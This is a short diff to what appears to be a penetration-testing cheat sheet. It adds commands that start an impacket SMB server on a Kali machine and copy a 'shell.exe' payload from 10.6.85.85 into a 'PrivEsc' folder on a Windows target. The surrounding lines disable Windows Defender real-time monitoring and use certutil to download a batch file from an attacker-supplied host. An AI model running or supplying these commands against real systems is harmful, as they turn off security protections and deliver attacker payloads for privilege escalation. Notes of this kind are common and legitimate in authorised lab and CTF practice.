@@ -8,6 +8,9 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 
 # File Transfer  
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .   
+copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe   
+
 certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat   
   
 ## Powershell
